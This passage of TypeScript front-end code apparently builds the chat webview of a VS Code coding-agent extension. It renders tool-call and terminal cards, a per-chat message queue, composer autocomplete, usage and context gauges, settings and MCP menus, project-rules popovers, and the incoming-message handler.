    const copyBtn = mkAct(ICON.copy, "Copy command + output");
    copyBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      const outEl = term.querySelector(".term-out") as HTMLElement | null;
      const outTxt = outEl && !outEl.querySelector(".term-wait") ? outEl.innerText : "";
      const payload = `$ ${cmd || meta.label}${outTxt ? "\n" + outTxt : ""}`;
      navigator.clipboard?.writeText(payload).then(() => {
        copyBtn.innerHTML = ICON.check;
        copyBtn.classList.add("ok");
        setTimeout(() => {
          copyBtn.innerHTML = ICON.copy;
          copyBtn.classList.remove("ok");
        }, 1200);
      });
    });
    const foldBtn = mkAct(ICON.chevron, "Collapse output");
    foldBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      const folded = term.classList.toggle("folded");
      foldBtn.title = folded ? "Expand output" : "Collapse output";
      foldBtn.setAttribute("aria-expanded", String(!folded));
    });
    bar.appendChild(copyBtn);
    bar.appendChild(foldBtn);
    if (id) {
      const pop = mkAct(ICON.external, "Open in the integrated terminal");
      pop.addEventListener("click", (e) => {
        e.stopPropagation();
        vscode.postMessage({ type: "openTerminal", id });
      });
      bar.appendChild(pop);
    }

    const cmdLine = document.createElement("div");
    cmdLine.className = "term-cmd";
    cmdLine.innerHTML = `<span class="term-prompt">$</span> ${esc(cmd || meta.label)}`;
    const out = document.createElement("div");
    out.className = "term-out running";
    out.innerHTML = `<span class="term-wait">running</span>`;
    term.appendChild(bar);
    term.appendChild(cmdLine);
    term.appendChild(out);
    card.appendChild(term);
    if (argStr && argStr !== "{}") {
      const det = document.createElement("details");
      det.className = "tool-detail";
      det.innerHTML =
        `<summary>args</summary>` +
        `<pre class="code"><code class="language-json">${esc(argStr)}</code></pre>`;
      card.appendChild(det);
      highlightWithin(det);
    }
  } else {
    const det = document.createElement("details");
    det.className = "tool-detail";
    det.innerHTML =
      `<summary>details</summary>` +
      `<pre class="code"><code class="language-json">${esc(argStr)}</code></pre>` +
      `<div class="tool-result"></div>`;
    card.appendChild(det);
    highlightWithin(det);
  }

  log.appendChild(card);
  if (id) toolCards.set(id, card);
  scroll();
}

function fmtDur(ms?: number): string {
  if (ms === undefined || ms < 0) return "";
  if (ms < 1000) return ms + "ms";
  if (ms < 60000) return (ms / 1000).toFixed(ms < 10000 ? 1 : 0) + "s";
  const m = Math.floor(ms / 60000);
  const s = Math.round((ms % 60000) / 1000);
  return `${m}m${s.toString().padStart(2, "0")}s`;
}

function addToolResult(id: string, content: string, isError: boolean, durationMs?: number) {
  const card = toolCards.get(id);
  if (!card) return;
  card.classList.remove("running");
  card.classList.add(isError ? "tool-err" : "tool-ok");

  const status = card.querySelector(".tool-status") as HTMLElement | null;
  if (status) {
    status.className = "tool-status " + (isError ? "err" : "ok");
    status.innerHTML = "";
    status.textContent = isError ? "✕" : "✓";
  }

  // Duration chip in the head (Hermes-style: every command shows how long it ran).
  const head = card.querySelector(".tool-head") as HTMLElement | null;
  if (head && durationMs !== undefined && durationMs >= 250 && !head.querySelector(".tool-dur")) {
    const dur = document.createElement("span");
    dur.className = "tool-dur";
    dur.textContent = fmtDur(durationMs);
    dur.title = "How long the command ran";
    // place it just before the ↗ pop-out button if present, else at the end
    const pop = head.querySelector(".term-pop");
    if (pop) head.insertBefore(dur, pop);
    else head.appendChild(dur);
  }

  // Terminal output → fill the visible pane.
  const termOut = card.querySelector(".term-out") as HTMLElement | null;
  if (termOut) {
    const body = (content || "").replace(/\s+$/, "");
    termOut.className = "term-out filled" + (isError ? " err" : "");
    termOut.textContent = body || "(no output)";
    linkifyPaths(termOut);
    // (copy lives in the titlebar now — created with the card, always present)
    scroll();
    return;
  }

  const slot = card.querySelector(".tool-result") as HTMLElement | null;
  if (!slot) return;
  slot.className = "tool-result " + (isError ? "err" : "ok");
  slot.innerHTML = `<pre class="code"><code>${esc(content)}</code></pre>`;
  if (!isError) highlightWithin(slot);
  linkifyPaths(slot);
  scroll();
}

function addTodos(todos: any[]) {
  const box = document.createElement("div");
  box.className = "todos";
  box.innerHTML =
    `<div class="todos-head">✓ To-dos</div>` +
    todos
      .map((t) => {
        const st = t.status || "pending";
        const icon = st === "completed" ? "☑" : st === "in_progress" ? "▣" : "☐";
        const label = st === "in_progress" ? t.activeForm || t.content : t.content;
        return `<div class="todo ${st}">${icon} ${esc(label || "")}</div>`;
      })
      .join("");
  log.appendChild(box);
  scroll();
}

// ---- per-chat send queue ----
// Messages typed while a chat is still replying are queued (per chat) and sent
// automatically when that reply finishes — other chats keep running in parallel.
const queueEl = $("queue");
const queues = new Map<string, { text: string }[]>();
function activeQueue(): { text: string }[] | undefined {
  if (!activeConvId) return undefined;
  let q = queues.get(activeConvId);
  if (!q) {
    q = [];
    queues.set(activeConvId, q);
  }
  return q;
}
function renderQueue() {
  const q = activeConvId ? queues.get(activeConvId) : undefined;
  if (!q || !q.length) {
    queueEl.classList.add("hidden");
    queueEl.innerHTML = "";
    return;
  }
  queueEl.classList.remove("hidden");
  queueEl.innerHTML = `<div class="queue-head">⏳ ${q.length} queued — sends when the reply finishes</div>`;
  q.forEach((item, i) => {
    const chip = document.createElement("div");
    chip.className = "queue-chip";
    const t = document.createElement("button");
    t.className = "queue-text";
    t.textContent = item.text;
    t.title = "Edit — put back in the composer";
    t.addEventListener("click", () => {
      q.splice(i, 1);
      input.value = input.value ? item.text + "\n" + input.value : item.text;
      autosize();
      input.focus();
      renderQueue();
      refreshComposer();
    });
    const now = document.createElement("button");
    now.className = "queue-now";
    now.textContent = "⏭";
    now.title = "Send now (stops the current reply)";
    now.addEventListener("click", () => {
      q.splice(i, 1);
      q.unshift(item); // front of the line
      renderQueue();
      vscode.postMessage({ type: "interrupt" }); // current reply ends → dispatch
    });
    const x = document.createElement("button");
    x.className = "queue-x";
    x.textContent = "✕";
    x.title = "Remove";
    x.addEventListener("click", () => {
      q.splice(i, 1);
      renderQueue();
    });
    chip.append(t, now, x);
    queueEl.appendChild(chip);
  });
}
function enqueue(text: string) {
  const q = activeQueue();
  if (!q) {
    addStatus("⚠ This chat is still running — wait for the reply or press Stop.", "error");
    return;
  }
  q.push({ text });
  renderQueue();
}
// Send the next queued message for the active chat once it's idle.
function maybeDispatch() {
  if (composerRunning) return;
  const q = activeConvId ? queues.get(activeConvId) : undefined;
  if (!q || !q.length) return;
  const next = q.shift()!;
  renderQueue();
  addUser(next.text);
  endAssistant();
  vscode.postMessage({ type: "prompt", text: next.text, attachments: [] });
}

// ---- composer ----
function submit() {
  const text = input.value.trim();
  if (!text && !attachments.length) return;
  // This chat is still working — queue the message (sent when the reply ends),
  // don't start a 2nd run or draw a phantom bubble.
  if (composerRunning) {
    if (text) enqueue(text);
    input.value = "";
    autosize();
    refreshComposer();
    return;
  }
  hideSlash();
  // /clear and /new start a fresh chat in the UI (and a fresh session)
  if (text === "/clear" || text === "/new") {
    input.value = "";
    vscode.postMessage({ type: "newChat" });
    return;
  }
  const atts = attachments.map((a) => a.path);
  const imgs = attachments.filter((a) => a.isImage && a.src).map((a) => a.src as string);
  const label = attachments.length ? "\n📎 " + attachments.map((a) => a.name).join(", ") : "";
  addUser(text + label, imgs);
  endAssistant();
  vscode.postMessage({ type: "prompt", text, attachments: atts });
  input.value = "";
  autosize();
  attachments = [];
  renderAttachments();
  refreshComposer(); // input emptied programmatically → flip Send⇄Stop back
}
send.addEventListener("click", submit);
input.addEventListener("keydown", (e) => {
  const popupOpen = !slashPopup.classList.contains("hidden");
  if (e.key === "Escape") return hideSlash();
  // Tab / Enter completes the first suggestion (slash command or @file)
  if ((e.key === "Tab" || (e.key === "Enter" && !e.shiftKey)) && popupOpen) {
    const first = slashPopup.querySelector(".slash-item") as HTMLElement;
    if (first) {
      e.preventDefault();
      if (first.classList.contains("file-item")) {
        pickFile(first.dataset.path || "", first.dataset.rel || "");
      } else {
        pickSlash(first.dataset.cmd || "");
      }
      return;
    }
  }
  if (e.key === "Enter") {
    if (e.shiftKey) return; // Shift+Enter → newline (default)
    e.preventDefault();
    if (e.ctrlKey || e.metaKey) {
      insertNewline(); // Ctrl/Cmd+Enter → newline
      return;
    }
    submit(); // Enter → send
  }
});
function insertNewline() {
  const s = input.selectionStart ?? input.value.length;
  const en = input.selectionEnd ?? s;
  input.value = input.value.slice(0, s) + "\n" + input.value.slice(en);
  input.selectionStart = input.selectionEnd = s + 1;
  autosize();
}

// Grow the composer with its content, up to the CSS max-height (then scroll).
// Coalesced into one measure+write per animation frame so rapid typing (or a
// laggy remote link) doesn't thrash layout and make the box visibly jitter.
let autosizeRaf = 0;
function autosize() {
  if (autosizeRaf) return;
  autosizeRaf = requestAnimationFrame(() => {
    autosizeRaf = 0;
    input.style.height = "auto";
    input.style.height = Math.min(input.scrollHeight, 168) + "px";
  });
}
input.addEventListener("input", autosize);
input.addEventListener("input", refreshComposer); // flip Send⇄Stop as you type

modeBtn.addEventListener("click", (e) => {
  e.stopPropagation();
  modeMenu.classList.toggle("open");
});
document.addEventListener("click", () => modeMenu.classList.remove("open"));
input.addEventListener("input", updateComposerPopups);

// ---- model picker (custom dropdown, mirrors the mode menu) ----
modelBtn.addEventListener("click", (e) => {
  e.stopPropagation();
  modelMenu.classList.toggle("open");
});
document.addEventListener("click", () => modelMenu.classList.remove("open"));
modelMenu.addEventListener("click", (e) => e.stopPropagation());

// ---- composer autocomplete: /commands and @file mentions ----
let atActive = false;
let atStart = -1;
function updateComposerPopups() {
  const v = input.value;
  const caret = input.selectionStart ?? v.length;
  const before = v.slice(0, caret);
  // @file mention: last token before the caret starts with @
  const atMatch = /(^|\s)@([\w./\\-]*)$/.exec(before);
  if (atMatch) {
    atActive = true;
    atStart = caret - atMatch[2].length - 1; // index of the '@'
    vscode.postMessage({ type: "searchFiles", query: atMatch[2] });
    return;
  }
  atActive = false;
  updateSlash();
}

function updateSlash() {
  const v = input.value;
  if (v.startsWith("/") && !v.includes(" ") && !v.includes("\n")) {
    const q = v.slice(1).toLowerCase();
    const matches = slashList.filter((c) => c.toLowerCase().startsWith(q));
    if (matches.length) {
      slashPopup.innerHTML = matches
        .map(
          (c) =>
            // Command names come from .claude/commands file names — repo content, so escaped.
            `<div class="slash-item" data-cmd="${esc(c)}"><span class="slash-cmd">/${esc(c)}</span>` +
            (SLASH_DESC[c] ? `<span class="slash-desc">${esc(SLASH_DESC[c])}</span>` : "") +
            `</div>`
        )
        .join("");
      slashPopup.querySelectorAll(".slash-item").forEach((el) =>
        el.addEventListener("mousedown", (ev) => {
          ev.preventDefault();
          pickSlash((el as HTMLElement).dataset.cmd || "");
        })
      );
      slashPopup.classList.remove("hidden");
      return;
    }
  }
  hideSlash();
}

function renderFileResults(items: any[]) {
  if (!atActive) return;
  if (!items || !items.length) {
    hideSlash();
    return;
  }
  slashPopup.innerHTML = items
    .slice(0, 30)
    .map(
      (it) =>
        `<div class="slash-item file-item" data-path="${esc(it.path)}" data-rel="${esc(it.rel)}">` +
        `<span class="slash-cmd">@${esc(it.name)}</span>` +
        `<span class="slash-desc">${esc(it.rel)}</span></div>`
    )
    .join("");
  slashPopup.querySelectorAll(".file-item").forEach((el) =>
    el.addEventListener("mousedown", (ev) => {
      ev.preventDefault();
      pickFile((el as HTMLElement).dataset.path || "", (el as HTMLElement).dataset.rel || "");
    })
  );
  slashPopup.classList.remove("hidden");
}

function pickFile(path: string, _rel: string) {
  // Remove the typed @token and attach the file (the agent reads it via Read).
  const v = input.value;
  const caret = input.selectionStart ?? v.length;
  if (atStart >= 0) {
    input.value = v.slice(0, atStart) + v.slice(caret);
    input.selectionStart = input.selectionEnd = atStart;
  }
  atActive = false;
  hideSlash();
  if (path) vscode.postMessage({ type: "addPathAttachment", paths: [path] });
  input.focus();
  autosize();
}

function pickSlash(cmd: string) {
  input.value = "/" + cmd + " ";
  hideSlash();
  input.focus();
}
function hideSlash() {
  atActive = false;
  slashPopup.classList.add("hidden");
}
stop.addEventListener("click", () => vscode.postMessage({ type: "interrupt" }));
newBtn.addEventListener("click", () => vscode.postMessage({ type: "newChat" }));
branchBtn.addEventListener("click", () => vscode.postMessage({ type: "branch" }));
chatsBtn.addEventListener("click", () => {
  chatsPanel.classList.toggle("hidden");
  if (!chatsPanel.classList.contains("hidden")) vscode.postMessage({ type: "listConversations" });
});
gitBtn.addEventListener("click", () => vscode.postMessage({ type: "gitCommit" }));
autofixBtn.addEventListener("click", () => vscode.postMessage({ type: "toggleAutoFix" }));

function renderAutoFix(on: boolean) {
  autofixBtn.classList.toggle("on", on);
  autofixBtn.title = `Auto-fix errors after edits (${on ? "on" : "off"})`;
}

superBtn.addEventListener("click", () => vscode.postMessage({ type: "toggleSuperTools" }));

const orchBtn = $("orchBtn");
orchBtn.addEventListener("click", () => {
  // Use the composer text as the goal if present; otherwise the extension prompts.
  const goal = input.value.trim();
  vscode.postMessage({ type: "orchestrate", goal });
  if (goal) {
    input.value = "";
    autosize();
  }
});
const remoteBtn = $("remoteBtn");
remoteBtn.addEventListener("click", () => vscode.postMessage({ type: "remote" }));
function renderRemote(on: boolean) {
  remoteBtn.classList.toggle("on", on);
  remoteBtn.setAttribute("aria-pressed", on ? "true" : "false");
  remoteBtn.title = on
    ? "Remote ON — click to stop (relay + tunnel + Telegram bot)"
    : "Remote: relay + tunnel + Telegram bot (access this chat from your phone)";
}
function renderSuperTools(on: boolean) {
  superBtn.classList.toggle("on", on);
  superBtn.title = `Super tools: dev server, browser eyes, memory, subagents (${on ? "on" : "off"})`;
}

// ---- plan usage gauges (5h / 7d windows) in the header ----
const limitsEl = $("limits");
function fmtReset(iso: string | null | undefined): string {
  if (!iso) return "";
  const t = Date.parse(iso);
  if (isNaN(t)) return "";
  const ms = t - Date.now();
  if (ms <= 0) return "resetting";
  const h = Math.floor(ms / 3600000);
  const m = Math.round((ms % 3600000) / 60000);
  if (h >= 24) return `${Math.round(h / 24)}d`;
  return h >= 1 ? `${h}h ${m}m` : `${m}m`;
}
function gauge(label: string, win: any): string {
  if (!win || win.utilization == null || !Number.isFinite(Number(win.utilization))) return "";
  const used = Math.max(0, Math.min(100, Number(win.utilization)));
  const remaining = Math.round(100 - used);
  const color =
    remaining <= 10 ? "var(--del-fg)" : remaining <= 25 ? "#d29922" : "var(--add-fg)";
  const deg = Math.round((remaining / 100) * 360); // filled arc = quota left
  const reset = fmtReset(win.resets_at ?? win.resetsAt);
  const title = `${label} window: ${remaining}% left${reset ? ` · resets in ${reset}` : ""}`;
  return (
    // The arc vars go through data-* + CSSOM (renderLimits): the panel's CSP
    // (style-src without 'unsafe-inline') drops inline style="" attributes.
    `<span class="limit-gauge" title="${esc(title)}" data-deg="${deg}" data-gc="${color}">` +
    `<span class="limit-num">${remaining}</span>` +
    `<span class="limit-lbl">${esc(label)}</span></span>`
  );
}
function renderLimits(info: any) {
  const html = info && info.available
    ? gauge("5h", info.fiveHour) + gauge("7d", info.sevenDay)
    : "";
  if (!html) {
    limitsEl.classList.add("hidden");
    limitsEl.innerHTML = "";
    return;
  }
  limitsEl.innerHTML = html;
  limitsEl.querySelectorAll<HTMLElement>(".limit-gauge").forEach((g) => {
    g.style.setProperty("--deg", `${g.dataset.deg}deg`);
    g.style.setProperty("--gc", g.dataset.gc || "");
  });
  limitsEl.classList.remove("hidden");
}

// ---- context bar (per-chat context-window usage) ----
const ctxbar = $("ctxbar");
const ctxFill = ctxbar.querySelector(".ctxbar-fill") as HTMLElement;
const ctxText = ctxbar.querySelector(".ctxbar-text") as HTMLElement;
const compactBtn = $("compactBtn");
compactBtn.addEventListener("click", () => vscode.postMessage({ type: "compact" }));
function fmtTok(n: number): string {
  if (n >= 1000) return (n / 1000).toFixed(n >= 10000 ? 0 : 1) + "k";
  return String(Math.round(n));
}
function renderContextUsage(info: any) {
  if (!info || !info.max) {
    ctxbar.classList.add("hidden");
    return;
  }
  const pct = Math.max(0, Math.min(100, Math.round(info.pct)));
  ctxFill.style.width = pct + "%";
  ctxFill.style.background =
    pct >= 90 ? "var(--del-fg)" : pct >= 80 ? "#d29922" : "var(--accent)";
  ctxText.textContent = `${fmtTok(info.used)} / ${fmtTok(info.max)} · ${pct}%`;
  compactBtn.classList.toggle("hidden", pct < 80);
  ctxbar.classList.remove("hidden");
}

// ---- header settings panel (module on/off) ----
settingsBtn.addEventListener("click", (e) => {
  e.stopPropagation();
  settingsMenu.classList.toggle("open");
});
document.addEventListener("click", () => settingsMenu.classList.remove("open"));
settingsMenu.addEventListener("click", (e) => e.stopPropagation());

// MCP servers shown at the bottom of the settings menu (list + configure).
let mcpItems: { name: string; transport: string; detail: string; source: string }[] = [];
function appendMcpSection() {
  const head = document.createElement("div");
  head.className = "menu-head";
  head.textContent = "MCP servers";
  settingsMenu.appendChild(head);
  for (const s of mcpItems) {
    const item = document.createElement("div");
    item.className = "ctx-item mcp-item";
    item.title = `${s.detail}\n(${s.source})`;
    item.innerHTML =
      `<span class="ctx-text"><span class="ctx-label">${esc(s.name)}</span>` +
      `<span class="ctx-desc">${esc(s.detail.slice(0, 46))}</span></span>` +
      `<span class="rules-badge">${esc(s.transport)}</span>`;
    item.addEventListener("click", (e) => {
      e.stopPropagation();
      vscode.postMessage({ type: "openMcp" });
      settingsMenu.classList.remove("open");
    });
    settingsMenu.appendChild(item);
  }
  const add = document.createElement("div");
  add.className = "ctx-item rules-add";
  add.innerHTML =
    `<span class="ctx-text"><span class="ctx-label">＋ ${
      mcpItems.length ? "Edit .mcp.json" : "Configure MCP servers"
    }</span>` +
    `<span class="ctx-desc">Extra tools for the agent (Claude Code format)</span></span>`;
  add.addEventListener("click", (e) => {
    e.stopPropagation();
    vscode.postMessage({ type: "openMcp" });
    settingsMenu.classList.remove("open");
  });
  settingsMenu.appendChild(add);
}

let lastSettingsValues: Record<string, boolean> = {};
function renderSettings(values: Record<string, boolean>) {
  lastSettingsValues = values;
  const sections: {
    title: string;
    rows: { key: string; label: string; desc: string; needs?: string }[];
  }[] = [
    {
      title: "Context",
      rows: [
        { key: "includeEditorContext", label: "Editor context", desc: "Active file + selection" },
        { key: "contextOpenTabs", label: "Open tabs", desc: "List of open files", needs: "includeEditorContext" },
        { key: "contextProblems", label: "Problems", desc: "Workspace errors / warnings", needs: "includeEditorContext" },
      ],
    },
    {
      title: "Automation",
      rows: [
        { key: "autoFixDiagnostics", label: "Auto-fix errors", desc: "Fix diagnostics after edits" },
        { key: "showStatusBar", label: "Status-bar HUD", desc: "State · model · cost" },
      ],
    },
    {
      title: "Super tools (experimental)",
      rows: [
        { key: "superTools", label: "Enable super tools", desc: "Master switch" },
        { key: "toolsEyes", label: "👁 Eyes", desc: "Browser screenshot + DOM", needs: "superTools" },
        { key: "toolsHands", label: "✋ Hands", desc: "Managed dev server", needs: "superTools" },
        { key: "toolsMemory", label: "🧠 Memory", desc: "Project memory file", needs: "superTools" },
        { key: "toolsScale", label: "🔭 Scale", desc: "Parallel subagents", needs: "superTools" },
      ],
    },
  ];

  settingsMenu.innerHTML = "";
  for (const sec of sections) {
    const head = document.createElement("div");
    head.className = "menu-head";
    head.textContent = sec.title;
    settingsMenu.appendChild(head);
    for (const r of sec.rows) {
      const on = !!values[r.key];
      const disabled = !!r.needs && !values[r.needs];
      const item = document.createElement("div");
      item.className = "ctx-item" + (on ? " on" : "") + (disabled ? " disabled" : "");
      item.innerHTML =
        `<span class="ctx-text"><span class="ctx-label">${r.label}</span>` +
        `<span class="ctx-desc">${r.desc}</span></span><span class="switch"></span>`;
      item.addEventListener("click", (e) => {
        e.stopPropagation();
        if (disabled) return;
        vscode.postMessage({ type: "setSetting", key: r.key, value: !on });
      });
      settingsMenu.appendChild(item);
    }
  }
  appendMcpSection();
}

// ---- context regulator (toolbar menu) ----
ctxBtn.addEventListener("click", (e) => {
  e.stopPropagation();
  ctxMenu.classList.toggle("open");
});
document.addEventListener("click", () => ctxMenu.classList.remove("open"));
ctxMenu.addEventListener("click", (e) => e.stopPropagation());

function renderContext(opts: { enabled: boolean; tabs: boolean; problems: boolean }) {
  ctxBtn.classList.toggle("on", opts.enabled);
  ctxBtn.title = opts.enabled
    ? "Context sent to the agent (on)"
    : "Context sent to the agent (off)";
  const rows: { key: "enabled" | "tabs" | "problems"; label: string; desc: string }[] = [
    { key: "enabled", label: "Editor context", desc: "Active file + selection" },
    { key: "tabs", label: "Open tabs", desc: "List of open files" },
    { key: "problems", label: "Problems", desc: "Workspace errors / warnings" },
  ];
  ctxMenu.innerHTML = `<div class="menu-head">Context sent to the agent</div>`;
  for (const r of rows) {
    const on = !!opts[r.key];
    // The sub-options only matter when the master switch is on.
    const disabled = r.key !== "enabled" && !opts.enabled;
    const item = document.createElement("div");
    item.className = "ctx-item" + (on ? " on" : "") + (disabled ? " disabled" : "");
    item.innerHTML =
      `<span class="ctx-text"><span class="ctx-label">${r.label}</span>` +
      `<span class="ctx-desc">${r.desc}</span></span>` +
      `<span class="switch" role="switch" aria-checked="${on}"></span>`;
    item.addEventListener("click", (e) => {
      e.stopPropagation();
      if (disabled) return;
      vscode.postMessage({ type: "setContextOpt", key: r.key, value: !on });
    });
    ctxMenu.appendChild(item);
  }
}

// ---- project rules (Cursor-style): chip + popover, always visible ----
let rulesItems: { name: string; path: string; chars: number; native: boolean }[] = [];
rulesBtn.addEventListener("click", (e) => {
  e.stopPropagation();
  rulesMenu.classList.toggle("open");
});
document.addEventListener("click", () => rulesMenu.classList.remove("open"));
rulesMenu.addEventListener("click", (e) => e.stopPropagation());

function fmtChars(n: number): string {
  if (n >= 1000) return (n / 1000).toFixed(1) + "k";
  return String(n);
}

function renderRules(items: typeof rulesItems) {
  rulesItems = items || [];
  const active = rulesItems.filter((r) => r.chars > 0);
  rulesBtn.innerHTML =
    `<span class="ticon">${ICON.rules}</span>` +
    `<span class="rules-count">${active.length ? "Rules · " + active.length : "Rules"}</span>`;
  rulesBtn.classList.toggle("has-rules", active.length > 0);

  rulesMenu.innerHTML = `<div class="menu-head">Project rules the agent follows</div>`;
  if (!rulesItems.length) {
    const empty = document.createElement("div");
    empty.className = "rules-empty";
    empty.textContent = "No rules yet — standing instructions the agent applies to every task in this project.";
    rulesMenu.appendChild(empty);
  }
  for (const r of rulesItems) {
    const item = document.createElement("div");
    item.className = "ctx-item rules-item";
    item.title = r.path + "  (click to edit)";
    item.innerHTML =
      `<span class="ctx-text"><span class="ctx-label">${esc(r.name)}</span>` +
      `<span class="ctx-desc">${r.chars ? fmtChars(r.chars) + " chars" : "empty"}${
        r.native ? " · loaded natively" : ""
      }</span></span>` +
      (r.native ? `<span class="rules-badge">native</span>` : "");
    item.addEventListener("click", (e) => {
      e.stopPropagation();
      vscode.postMessage({ type: "openRules", path: r.path });
      rulesMenu.classList.remove("open");
    });
    rulesMenu.appendChild(item);
  }
  const add = document.createElement("div");
  add.className = "ctx-item rules-add";
  add.innerHTML = `<span class="ctx-text"><span class="ctx-label">＋ ${
    rulesItems.some((r) => r.name === "AGENTS.md") ? "Open AGENTS.md" : "Create AGENTS.md"
  }</span><span class="ctx-desc">Project rules file (template included)</span></span>`;
  add.addEventListener("click", (e) => {
    e.stopPropagation();
    vscode.postMessage({ type: "createRules" });
    rulesMenu.classList.remove("open");
  });
  rulesMenu.appendChild(add);
}

// Per-turn visibility: a quiet note listing the rules this run relies on.
let lastRulesNoteChat: string | undefined;
function addRulesNote(names: string[]) {
  if (!names || !names.length) return;
  // Once per chat view — repeating it every turn is noise.
  if (lastRulesNoteChat === activeConvId) return;
  lastRulesNoteChat = activeConvId;
  const d = document.createElement("div");
  d.className = "rules-note";
  d.innerHTML =
    `<span class="ticon">${ICON.rules}</span>` +
    `<span>Rules: ${names.map((n) => esc(n)).join(" · ")}</span>`;
  log.appendChild(d);
  scroll();
}

// Whether the chat you're viewing has an active run.
let composerRunning = false;
// Smart composer button: Stop only makes sense when a run is active AND you have
// nothing typed; the moment you type, it's Send (your next message). Recomputed
// on every relevant change (run start/stop, chat switch, keystroke).
function refreshComposer() {
  const showStop = composerRunning && !input.value.trim();
  stop.classList.toggle("hidden", !showStop);
  send.classList.toggle("hidden", showStop);
}
function setRunning(on: boolean) {
  composerRunning = on;
  refreshComposer();
}

// ---- incoming ----
window.addEventListener("message", (event) => {
  const m = event.data;
  switch (m.type) {
    case "started":
      endAssistant();
      endThinking();
      runModel = m.model || currentModel;
      setRunning(true);
      if (m.rules) addRulesNote(m.rules);
      clearWorking();
      workingEl = addTyping();
      break;
    case "rules":
      renderRules(m.items || []);
      break;
    case "identity":
      assistantName = m.name || "Kari";
      break;
    case "mcp":
      mcpItems = m.items || [];
      renderSettings(lastSettingsValues); // redraw the menu with the MCP section
      break;
    case "info":
      endThinking();
      addStatus(m.text, "");
      break;
    case "user":
      // User message echoed by the host to views that didn't type it locally
      // (cross-device mirror). The originating view already drew its own.
      endAssistant();
      addUser(m.text);
      break;
    case "text":
      endThinking();
      setTypingLabel("writing");
      assistantText(m.text);
      break;
    case "thinking":
      endAssistant();
      setTypingLabel("reasoning");
      addThinking(m.text);
      break;
    case "tool":
      endAssistant();
      endThinking();
      setTypingLabel("working");
      addTool(m.id, m.name, m.input);
      break;
    case "approval":
      endAssistant();
      endThinking();
      renderApproval(m);
      break;
    case "approvalResolved":
      resolveApprovalCard(m.id, m.approved === true);
      break;
    case "question":
      endAssistant();
      endThinking();
      renderQuestion(m.id, m.questions);
      break;
    case "questionResolved":
      resolveQuestionCard(m.id);
      break;
    case "confirm":
      endAssistant();
      endThinking();
      renderConfirm(m.id, m.title, m.options || []);
      break;
    case "confirmResolved":
      resolveConfirmCard(m.id);
      break;
    case "toolResult":
      addToolResult(m.id, m.content, m.isError, m.durationMs);
      break;
    case "result": {
      endAssistant();
      endThinking();
      clearWorking();
      // No "✓ done" shout — the reply ending speaks for itself. Just a whisper
      // of the turn cost when we know it; nothing otherwise.
      if (typeof m.costUsd === "number" && m.costUsd > 0) {
        addStatus(`$${m.costUsd < 1 ? m.costUsd.toFixed(4) : m.costUsd.toFixed(2)}`, "meta");
      }
      updateContextPill(m.usage);
      break;
    }
    case "fileResults":
      renderFileResults(m.items);
      break;
    case "insertContext":
      insertContext(m);
      break;
    case "idle":
      endAssistant();
      endThinking();
      clearWorking();
      setRunning(false);
      maybeDispatch(); // send the next queued message for this chat, if any
      break;
    case "error":
      endAssistant();
      endThinking();
      clearWorking();
      setRunning(false);
      addStatus(`⚠ ${m.message}`, "error");
      break;
    case "notice":
      // Transient warning (e.g. "chat already running") — must NOT reset the
      // run state, or Stop would vanish while the agent is still working.
      addStatus(`⚠ ${m.message}`, "error");
      break;
    case "clear":
      clearLog();
      renderWelcome();
      setRunning(false); // a fresh/cleared chat is never running
      clearWorking();
      break;
    case "loadConversation":
      clearLog();
      loadStored(m.messages || [], m.draft);
      break;
    case "conversations":
      allConversations = m.items || [];
      activeConvId = m.activeId;
      renderConversations(allConversations);
      renderTabs(allConversations, m.activeId);
      renderQueue(); // show the queue belonging to the now-active chat
      maybeDispatch();
      break;
    case "runState":
      // Which chats have an active run — spinner on their tabs (parallel ok).
      if (m.running) runningChatIds.add(m.convId);
      else runningChatIds.delete(m.convId);
      // Drive Send/Stop for the chat you're actually viewing.
      if (m.convId === activeConvId) {
        setRunning(m.running);
        if (!m.running) maybeDispatch();
      }
      renderTabs(allConversations, activeConvId);
      fillChatRows();
      break;
    case "model":
      renderModel(m.options, m.model);
      break;
    case "mode":
      renderMode(m.options, m.mode);
      break;
    case "autofix":
      renderAutoFix(m.on);
      break;
    case "supertools":
      renderSuperTools(m.on);
      break;
    case "remoteState":
      renderRemote(m.on);
      break;
    case "contextUsage":
      renderContextUsage(m.info);
      break;
    case "usageLimits":
      renderLimits(m.info);
      break;
    case "settings":
      renderSettings(m.values);
      break;
    case "context":
      renderContext(m.opts);
      break;
    case "changes":
      renderChanges(m.items);
      break;
    case "attached":
      attachments.push({ path: m.path, name: m.name, isImage: !!m.isImage, src: m.src });
      renderAttachments();
      break;
    case "auth":
      renderAuth(m.ok, m);
      break;
    case "slashCommands":
      mergeSlash(m.items);
      break;
    case "system":
      renderSystem(m.subtype, m.data);
      break;
  }
});

function renderModel(options: any[], current: string) {
  if (options?.length) {
    // Dedupe by value — the SDK occasionally returns the same model twice,
    // which showed up as duplicate "Opus" entries in the picker.
    const seen = new Set<string>();
    modelOptionsList = [];
    for (const o of options) {
      if (!o?.value || seen.has(o.value)) continue;
      seen.add(o.value);
      modelOptionsList.push({ value: o.value, label: o.label || o.value, title: o.title });
      modelLabels[o.value] = o.label || o.value;
    }
  }
  if (current) currentModel = current;
  // Unknown saved model (older value): show it as its own option so the button
  // isn't blank.
  if (currentModel && !modelOptionsList.some((o) => o.value === currentModel)) {
    modelOptionsList.unshift({ value: currentModel, label: modelLabels[currentModel] || currentModel });
    modelLabels[currentModel] = modelLabels[currentModel] || currentModel;
  }

  const active = modelOptionsList.find((o) => o.value === currentModel);
  modelBtn.textContent = (active ? active.label : currentModel) + " ▾";
  modelBtn.title = active?.title || "Model";

  modelMenu.innerHTML = `<div class="menu-head">Model</div>`;
  for (const o of modelOptionsList) {
    const item = document.createElement("div");
    item.className = "mode-item" + (o.value === currentModel ? " active" : "");
    item.innerHTML =
      `<span class="mode-item-label">${esc(o.label)}</span>` +
      (o.title ? `<span class="mode-item-desc">${esc(o.title)}</span>` : "");
    item.addEventListener("click", (e) => {
      e.stopPropagation();
      currentModel = o.value;
      modelMenu.classList.remove("open");
      renderModel(modelOptionsList, o.value);
      vscode.postMessage({ type: "setModel", model: o.value });
    });
    modelMenu.appendChild(item);
  }
}

changesBadge.addEventListener("click", (e) => {
  e.stopPropagation();
  changesPop.classList.toggle("open");
});
changesPop.addEventListener("click", (e) => e.stopPropagation());
document.addEventListener("click", () => changesPop.classList.remove("open"));

function renderChanges(items: any[]) {
  if (!items || !items.length) {
    changesBar.classList.add("hidden");
